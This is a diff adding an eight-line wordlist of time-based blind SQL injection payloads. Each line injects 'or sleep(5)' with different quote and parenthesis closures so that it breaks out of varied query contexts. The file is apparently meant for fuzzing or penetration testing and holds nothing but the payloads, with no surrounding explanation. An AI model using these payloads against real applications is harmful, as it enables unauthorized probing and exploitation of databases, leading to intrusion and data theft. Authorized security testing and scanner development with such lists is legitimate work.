@@ -1,0 +1,8 @@
+ or sleep(5)
+) or sleep(5) or 1=(1
+' or sleep(5) or 'a'='a
+" or sleep(5) or "a"="a
+') or sleep(5) or ('a'='a
+") or sleep(5) or ("a"="a
+')) or sleep(5) or (('a'='a
+")) or sleep(5) or (("a"="a
